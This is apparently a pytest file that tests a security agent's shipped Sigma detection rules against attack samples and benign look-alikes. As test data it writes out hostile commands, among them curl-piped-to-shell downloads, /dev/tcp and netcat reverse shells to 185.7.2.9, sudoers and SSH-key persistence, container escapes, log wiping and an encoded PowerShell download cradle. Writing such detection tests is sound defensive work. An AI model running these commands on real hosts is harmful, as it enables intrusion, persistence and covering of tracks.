"""The rules that ship with the agent, measured against the corpus.

`conf/sigma/` used to be empty on purpose - the argument being that a
detection nobody reviewed is not an improvement. The argument was fine and the
outcome was not: ATT&CK coverage was zero on every install, the coverage page
had nothing to draw, and "no rules installed" is not a defensible default for
a product whose job is detection.

So a baseline ships, and it earns its place here rather than by existing. The
test that matters is not that the rules parse - it is that they fire on real
attacks and stay quiet on the hard negatives, because a rule that loads and
never matches is indistinguishable from a rule nobody wrote.
"""
from __future__ import annotations

import base64
import json
import pathlib
import re

import pytest

from core import sigma
from core.sigma_loader import (SYSMON_FIELDS, WINDOWS_FIELDS,
                               journal_event_fields, load_dir, match_all,
                               text_event_fields, windows_event_fields)

ROOT = pathlib.Path(__file__).resolve().parent.parent
RULES_DIR = ROOT / "Sentora" / "conf" / "sigma"
CORPUS = ROOT / "evals" / "corpus_attacks.jsonl"


@pytest.fixture(scope="module")
def loaded():
    return load_dir(RULES_DIR)


# --------------------------------------------------------------------------
# They load
# --------------------------------------------------------------------------

def test_rules_ship_with_the_agent(loaded):
    """An empty rules directory means zero ATT&CK coverage on every install,
    and a coverage page that is empty for a reason nobody can see."""
    assert loaded.rules, "no Sigma rules ship - ATT&CK coverage would be zero"


def test_every_shipped_rule_compiles(loaded):
    """These are ours. A community rule failing to load is the operator's to
    resolve; one of ours failing is a bug we shipped."""
    assert loaded.rejected == []


def test_every_rule_carries_a_technique(loaded):
    """The ATT&CK coverage page reads the tags. A rule without one detects
    something and contributes nothing to the picture of what is covered."""
    untagged = [r.title for r in loaded.rules if not r.techniques]
    assert untagged == []


def test_every_rule_records_what_would_falsely_trigger_it(loaded):
    """An analyst dismissing an alert needs to know what benign thing looks
    like this. Writing it down at authoring time is the only moment anybody
    actually knows."""
    missing = [r.title for r in loaded.rules if not getattr(r, "falsepositives", None)]
    assert missing == [], f"no falsepositives recorded: {missing}"


# --------------------------------------------------------------------------
# They fire
# --------------------------------------------------------------------------

CORPUS_FIELDS = {
    "CommandLine": "CommandLine", "ParentImage": "ParentProcessName",
    "ImagePath": "ImagePath", "Command": "TaskContent", "TaskName": "TaskName",
    "TargetObject": "TargetObject", "Details": "Details",
    "ServiceName": "ServiceName", "IpAddress": "IpAddress",
}


def _corpus():
    return [json.loads(line) for line
            in CORPUS.read_text(encoding="utf-8").splitlines() if line.strip()]


def _message(case):
    raw = case["event"].get("message") or ""
    try:
        return json.loads(raw).get("message") or raw
    except (ValueError, TypeError):
        return raw


def _as_event(text: str) -> dict:
    """Put back the named fields the corpus flattened into one line.

    The corpus stores what an analyst would read. The agent supplies
    StringInserts, so replaying it faithfully means reversing that.
    """
    eid = int((re.search(r"EID=(\d+)", text) or [0, "0"])[1] or 0)
    channel = (re.search(r"^\[(\w+)]", text) or ["", ""])[1]
    if channel == "Sysmon":
        channel = "Microsoft-Windows-Sysmon/Operational"

    table = SYSMON_FIELDS if "sysmon" in channel.lower() else WINDOWS_FIELDS
    names = table.get(eid, [])
    inserts = [""] * len(names)
    for corpus_name, schema_name in CORPUS_FIELDS.items():
        found = re.search(re.escape(corpus_name) + r"=([^|]*)", text)
        if found and schema_name in names:
            inserts[names.index(schema_name)] = found.group(1).strip()
    if eid == 4104 and "ScriptBlockText" in names:
        parts = text.split("ScriptBlock |", 1)
        if len(parts) == 2:
            inserts[names.index("ScriptBlockText")] = parts[1].strip()
    return windows_event_fields(eid, inserts, message=text, channel=channel)


# Password spray is the deliberate exception. It is a shape across several
# events - one password, many accounts, one source - and stateless Sigma has
# no way to express it.
#
# It is not undetected: `core.correlation` covers it, and
# test_the_case_sigma_cannot_express_is_covered_elsewhere below proves that
# rather than leaving this as an unexplained hole.
NEEDS_CORRELATION = {"constructed:t1110-password-spray"}


@pytest.mark.parametrize("case", [
    c for c in _corpus() if c["expected"] in ("CRITICAL", "SUSPICIOUS")
], ids=lambda c: c["id"])
def test_attacks_are_caught_by_sigma_alone(case, loaded):
    """Without the AI and without the regex list. Sigma is the deterministic
    layer, and the layer that still works when the model is unavailable."""
    if case["id"] in NEEDS_CORRELATION:
        pytest.skip("a shape across events; core.correlation covers it, see "
                    "test_the_case_sigma_cannot_express_is_covered_elsewhere")
    hits = match_all(loaded.rules, _as_event(_message(case)))
    assert hits, f"no shipped rule fires on {case['id']}"


@pytest.mark.parametrize("case", [
    c for c in _corpus() if c["expected"] == "NOT_CRITICAL"
], ids=lambda c: c["id"])
def test_hard_negatives_stay_quiet(case, loaded):
    """These are chosen to look like the attacks: a service from a remote
    share, hidden no-profile PowerShell, base64 on a command line. A baseline
    that fires on them costs more attention than it saves."""
    hits = match_all(loaded.rules, _as_event(_message(case)))
    assert not hits, f"{case['id']} falsely matched {[h.title for h in hits]}"


def test_the_text_only_path_is_honest_about_what_it_cannot_do(loaded):
    """A syslog line has no CommandLine, so the Windows rules cannot fire on
    it. Worth pinning: the failure to match here is a property of text logs,
    not a broken rule, and the distinction should not quietly reverse."""
    for case in _corpus():
        fields = text_event_fields(_message(case), "corpus")
        assert set(fields) <= {"Message", "LogFile", "SourceIp", "User"}


# --------------------------------------------------------------------------
# Field mapping
# --------------------------------------------------------------------------

def test_sysmon_ids_are_not_read_on_other_channels():
    """Sysmon's EventID 1 is a process creation. EventID 1 on the System
    channel is not, and reading it through Sysmon's layout would put arbitrary
    text into `Image` and `CommandLine` - inventing evidence for whichever
    rule happened to match it."""
    system = windows_event_fields(1, ["a", "b", "c"], channel="System")
    assert "Image" not in system
    assert "CommandLine" not in system

    sysmon = windows_event_fields(
        1, ["rule", "t", "guid", "404", "C:\\x.exe"],
        channel="Microsoft-Windows-Sysmon/Operational")
    assert sysmon["Image"] == "C:\\x.exe"


def test_a_script_block_is_addressable_as_a_command_line():
    """4104 and 4688 answer the same question - what was run - and an estate
    with script block logging on may never see the process event at all."""
    fields = windows_event_fields(4104, ["powershell -enc AAA", "C:\\s.ps1"],
                                  channel="Microsoft-Windows-PowerShell/Operational")
    assert fields["CommandLine"] == "powershell -enc AAA"


def test_a_journal_entry_keeps_its_own_names_and_gains_sigma_ones():
    from core.sigma_loader import journal_event_fields
    fields = journal_event_fields({"_COMM": "sshd", "MESSAGE": b"accepted",
                                   "_CMDLINE": "/usr/sbin/sshd -D"})
    assert fields["Image"] == "sshd"
    assert fields["_COMM"] == "sshd"
    assert fields["CommandLine"] == "/usr/sbin/sshd -D"
    assert fields["Message"] == "accepted"


# --------------------------------------------------------------------------
# The modifiers those rules depend on
# --------------------------------------------------------------------------

def _rule(detection: str):
    return sigma.parse(
        "title: t\nlogsource: {product: windows}\ndetection:\n" + detection, "t")


@pytest.mark.parametrize("shift", range(6))
def test_utf16_base64offset_finds_a_needle_at_every_alignment(shift):
    """PowerShell's -EncodedCommand takes UTF-16LE. A needle encoded as UTF-8
    and base64'd cannot appear in that payload at all, so without this the
    detection does not fire - and nothing says why.

    The shift is what makes this a real test: base64 packs three bytes into
    four characters, so the encoding of a substring depends on where it starts
    and where it ends. All six offsets have to match or the rule fires only
    on payloads that happen to be aligned.
    """
    rule = _rule("    sel:\n        CommandLine|utf16le|base64offset|contains: 'Net.WebClient'\n"
                 "    condition: sel\n")
    script = "x" * shift + "IEX (New-Object Net.WebClient).DownloadString('http://h/a')"
    payload = base64.b64encode(script.encode("utf-16-le")).decode()
    assert rule.matches({"CommandLine": "powershell -nop -enc " + payload})


def test_utf16_base64offset_does_not_match_an_unrelated_payload():
    rule = _rule("    sel:\n        CommandLine|utf16le|base64offset|contains: 'Net.WebClient'\n"
                 "    condition: sel\n")
    payload = base64.b64encode("Get-Date; Write-Host hi".encode("utf-16-le")).decode()
    assert not rule.matches({"CommandLine": "powershell -enc " + payload})


@pytest.mark.parametrize("shift", range(6))
def test_plain_base64offset_still_works(shift):
    """UTF-8 is the default and the Linux case; adding an encoding step must
    not have broken it."""
    rule = _rule("    sel:\n        Message|base64offset|contains: 'curl http'\n"
                 "    condition: sel\n")
    blob = base64.b64encode(("y" * shift + "curl http://evil/x | sh").encode()).decode()
    assert rule.matches({"Message": blob})


def test_an_encoding_modifier_alone_is_rejected_not_silently_useless():
    """On its own it would compare UTF-16 bytes against a str and never be
    equal - a rule that loads, reports as covered, and detects nothing. The
    loudest possible failure is the right one here."""
    with pytest.raises(sigma.UnsupportedRule):
        _rule("    sel:\n        CommandLine|utf16le|contains: 'x'\n    condition: sel\n")


def test_a_developer_encoding_a_config_is_not_an_encoded_cradle(loaded):
    """The distinction the base64 matching exists to make. Both are base64 on
    a PowerShell command line; only one of them is fetching remote code."""
    benign = windows_event_fields(
        4104, ["[Convert]::FromBase64String($env:APP_CONFIG)", "C:\\dev"],
        channel="Microsoft-Windows-PowerShell/Operational")
    assert not match_all(loaded.rules, benign)


# --------------------------------------------------------------------------
# Linux
# --------------------------------------------------------------------------
#
# The corpus is entirely Windows, so until these existed the Linux rules were
# only known to *load*. That is the exact gap core/sigma_loader warns about: a
# rule that loads and never matches is indistinguishable, from the console,
# from a rule nobody wrote.

LINUX_ATTACKS = [
    ("sudoers-via-tee",
     {"_COMM": "sudo", "_CMDLINE": "/bin/sh -c echo 'jdoe ALL=(ALL) NOPASSWD:ALL'"
                                   " | tee -a /etc/sudoers.d/jdoe",
      "MESSAGE": "jdoe : TTY=pts/0 ; USER=root ; COMMAND=/bin/sh -c echo"
                 " 'jdoe ALL=(ALL) NOPASSWD:ALL' | tee -a /etc/sudoers.d/jdoe"}),
    ("authorized-keys-appended",
     {"_COMM": "bash", "_CMDLINE": "bash -c echo ssh-ed25519 AAAAC3Nz..."
                                   " >> /root/.ssh/authorized_keys",
      "MESSAGE": "root : COMMAND=/bin/bash -c echo ssh-ed25519 AAAAC3Nz..."
                 " >> /root/.ssh/authorized_keys"}),
    ("curl-piped-to-shell",
     {"_COMM": "sh", "_CMDLINE": "/bin/sh -c curl -s http://185.7.2.9/x.sh | bash",
      "MESSAGE": "COMMAND=/bin/sh -c curl -s http://185.7.2.9/x.sh | bash"}),
    ("history-cleared",
     {"_COMM": "bash", "_CMDLINE": "bash -c rm -f ~/.bash_history",
      "MESSAGE": "COMMAND=/bin/bash -c rm -f /home/jdoe/.bash_history"}),
]

LINUX_BENIGN = [
    ("sshd-accepted-key",
     {"_COMM": "sshd", "_CMDLINE": "/usr/sbin/sshd -D",
      "MESSAGE": "Accepted publickey for jdoe from 10.0.0.9 port 51234 ssh2"}),
    ("apt-install",
     {"_COMM": "apt", "_CMDLINE": "apt-get install -y nginx",
      "MESSAGE": "Setting up nginx (1.24.0-1) ..."}),
    ("cron-backup",
     {"_COMM": "CRON", "_CMDLINE": "/usr/sbin/cron -f",
      "MESSAGE": "(root) CMD (/usr/local/bin/backup.sh >> /var/log/backup.log)"}),
    # The one most likely to be got wrong: a download that is not piped
    # anywhere. Fetching a release tarball is not execution.
    ("curl-to-a-file",
     {"_COMM": "curl", "_CMDLINE": "curl -o /tmp/rel.tgz https://vendor/rel.tgz",
      "MESSAGE": "COMMAND=curl -o /tmp/rel.tgz https://vendor/rel.tgz"}),
]


@pytest.mark.parametrize("name,entry", LINUX_ATTACKS, ids=[c[0] for c in LINUX_ATTACKS])
def test_linux_rules_fire_on_the_journal(name, entry, loaded):
    assert match_all(loaded.rules, journal_event_fields(entry)), name


@pytest.mark.parametrize("name,entry", LINUX_BENIGN, ids=[c[0] for c in LINUX_BENIGN])
def test_linux_rules_stay_quiet_on_ordinary_activity(name, entry, loaded):
    hits = match_all(loaded.rules, journal_event_fields(entry))
    assert not hits, f"{name} falsely matched {[h.title for h in hits]}"


@pytest.mark.parametrize("name,entry", LINUX_ATTACKS, ids=[c[0] for c in LINUX_ATTACKS])
def test_linux_rules_also_work_on_a_plain_syslog_line(name, entry, loaded):
    """Deliberate, and the reason each Linux rule carries `Message|contains`
    alternatives beside its `CommandLine` ones.

    A syslog line has no named fields, so a rule written only against
    `CommandLine` - which is how the Windows rules are written, correctly -
    would be dead on any host using rsyslog rather than journald. sudo logs
    the command it ran into the message text, and that is enough to match on.
    """
    line = f"Aug 25 03:14:07 web-01 sudo: {entry['MESSAGE']}"
    assert match_all(loaded.rules, text_event_fields(line, "/var/log/auth.log")), name


def test_every_linux_rule_is_exercised_by_these_cases(loaded):
    """Otherwise a rule could be added, never fire, and nothing would say so.

    This is the guard that caught the widened rule set: eight new rules were
    added and this failed until each had a case, which is the point of having
    it rather than trusting that whoever adds a rule also adds a test.
    """
    linux = {r.title for r in loaded.rules
             if str(r.logsource.get("product", "")).lower() == "linux"}

    fired = {h.title for _, entry in LINUX_ATTACKS
             for h in match_all(loaded.rules, journal_event_fields(entry))}
    fired |= {h.title for _, command in LINUX_COMMANDS_THAT_SHOULD_FIRE
              for h in match_all(loaded.rules, _journal(command))}

    assert linux - fired == set(), f"Linux rules never exercised: {linux - fired}"


def test_the_case_sigma_cannot_express_is_covered_elsewhere():
    """The skip above is only defensible if something else catches it.

    A test that skips with a good reason and no follow-up is how a gap gets
    documented into permanence: every run reports a reason, nobody reports a
    missing detection.
    """
    from core.correlation import default_engine

    engine = default_engine()
    found = []
    for i, user in enumerate(("jdoe", "asmith", "rpatel", "mchen", "klopez")):
        found += engine.observe(
            {"EventID": "4625", "TargetUserName": user,
             "IpAddress": "10.20.30.41", "LogonType": "3"},
            now=1000.0 + i * 8)

    assert [d.rule for d in found] == ["password_spray"]
    assert "T1110.003" in found[0].techniques


# --------------------------------------------------------------------------
# The Linux side, widened
# --------------------------------------------------------------------------
#
# It shipped with four rules against Windows' twelve, so cron persistence,
# systemd units, LD_PRELOAD, kernel modules and container escape were all
# blind. The negatives here matter more than the positives: every one of them
# is ordinary administration that resembles the attack it sits beside, and a
# baseline that fires on `docker ps` costs more attention than it saves.

LINUX_COMMANDS_THAT_SHOULD_FIRE = [
    ("cron-dropin", "echo '* * * * * root curl -s http://185.7.2.9/x | sh'"
                    " | tee /etc/cron.d/update"),
    ("systemd-unit", "sh -c 'cat > /etc/systemd/system/updater.service' ;"
                     " systemctl enable updater"),
    ("ld-so-preload", "sh -c \"echo /tmp/libx.so > /etc/ld.so.preload\""),
    ("ld-preload-env", "LD_PRELOAD=/dev/shm/evil.so /usr/bin/id"),
    ("kernel-module", "insmod /tmp/rootkit.ko"),
    ("docker-sock-mount", "docker run -v /var/run/docker.sock:"
                          "/var/run/docker.sock -it alpine sh"),
    ("nsenter-escape", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"),
    ("reverse-shell-devtcp", "bash -c 'bash -i >& /dev/tcp/185.7.2.9/4444 0>&1'"),
    ("nc-reverse-shell", "nc 185.7.2.9 4444 -e /bin/bash"),
    ("auditctl-flush", "auditctl -D"),
    ("setenforce-permissive", "setenforce 0"),
    ("suid-shell", "chmod u+s /tmp/bash"),
    # The quieter sibling of the suid bit: nothing about the file's mode looks
    # unusual, and `getcap -r /` is in almost nobody's routine.
    ("setcap-setuid", "setcap cap_setuid+ep /usr/bin/python3.11"),
    # Truncation rather than deletion. A missing log is noticed; a log that
    # still exists and is empty usually is not.
    ("wtmp-truncated", "truncate -s 0 /var/log/wtmp"),
    # Persistence nowhere near cron, systemd or rc.local, which is where a
    # check looks.
    ("bashrc-appended",
     "sh -c \"echo 'curl -s http://185.7.2.9/x | sh' >> /home/deploy/.bashrc\""),
    # The daemon itself becomes the backdoor - no new binary, no new service.
    ("sshd-permitrootlogin",
     "sh -c \"echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config\""),
]

LINUX_COMMANDS_THAT_MUST_NOT = [
    ("apt-install", "apt-get install -y nginx"),
    ("systemctl-restart", "systemctl restart nginx"),
    ("read-crontab", "cat /etc/crontab"),
    ("docker-ps", "docker ps -a"),
    ("docker-build", "docker build -t app ."),
    ("nc-port-check", "nc -z 10.0.0.5 443"),
    ("chmod-normal", "chmod 755 /usr/local/bin/deploy.sh"),
    ("modprobe-from-lib", "modprobe /lib/modules/6.1.0/kernel/fs/nfs.ko"),
    ("curl-to-file", "curl -o /tmp/rel.tgz https://vendor/rel.tgz"),
    ("find-suid-audit", "find / -perm -4000 -type f"),
    ("ufw-status", "ufw status verbose"),
    ("journalctl", "journalctl -u nginx --since today"),
]


def _journal(command: str) -> dict:
    return journal_event_fields({"_COMM": command.split()[0],
                                 "_CMDLINE": command,
                                 "MESSAGE": f"COMMAND={command}"})


def _syslog(command: str) -> dict:
    return text_event_fields(
        f"Aug 25 03:14:07 web-01 sudo: jdoe : TTY=pts/0 ; USER=root ;"
        f" COMMAND={command}", "/var/log/auth.log")


@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_SHOULD_FIRE,
                         ids=[c[0] for c in LINUX_COMMANDS_THAT_SHOULD_FIRE])
def test_linux_attacks_fire_on_the_journal(name, command, loaded):
    assert match_all(loaded.rules, _journal(command)), name


@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_SHOULD_FIRE,
                         ids=[c[0] for c in LINUX_COMMANDS_THAT_SHOULD_FIRE])
def test_linux_attacks_fire_on_a_syslog_line_too(name, command, loaded):
    """A rule written only against `CommandLine` is dead on a host using
    rsyslog rather than journald, and nothing would say so."""
    assert match_all(loaded.rules, _syslog(command)), name


@pytest.mark.parametrize("name,command", LINUX_COMMANDS_THAT_MUST_NOT,
                         ids=[c[0] for c in LINUX_COMMANDS_THAT_MUST_NOT])
def test_ordinary_linux_administration_stays_quiet(name, command, loaded):
    """Each of these sits beside an attack it resembles: `docker ps` beside a
    socket mount, `find -perm -4000` beside setting SUID, `modprobe` from
    /lib beside insmod from /tmp. The path and the arguments are what
    separate them."""
    hits = match_all(loaded.rules, _journal(command))
    assert not hits, f"{name} falsely matched {[h.title for h in hits]}"


def test_linux_coverage_is_no_longer_a_token_gesture(loaded):
    """Four rules against Windows' twelve left cron, systemd, LD_PRELOAD,
    kernel modules and container escape entirely blind."""
    linux = [r for r in loaded.rules
             if str(r.logsource.get("product", "")).lower() == "linux"]
    assert len(linux) >= 12, f"only {len(linux)} Linux rules"

    covered = {t for r in linux for t in r.techniques}
    for technique in ("T1053.003", "T1543.002", "T1574.006", "T1547.006",
                      "T1611", "T1548.001"):
        assert technique in covered, technique
